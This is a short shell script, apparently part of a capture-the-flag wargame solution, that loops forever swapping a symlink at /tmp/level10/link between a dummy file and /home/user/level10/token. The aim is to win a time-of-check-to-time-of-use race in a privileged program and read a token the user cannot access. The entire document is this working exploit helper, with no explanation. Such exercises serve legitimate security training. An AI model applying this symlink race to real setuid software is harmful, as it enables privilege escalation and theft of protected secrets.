#!/bin/sh
mkdir /tmp/level10/
touch /tmp/level10/fail
chmod 755 /tmp/level10/fail
while [ true ];
do ln -f -s /tmp/level10/fail /tmp/level10/link;
ln -f -s /home/user/level10/token /tmp/level10/link;
done
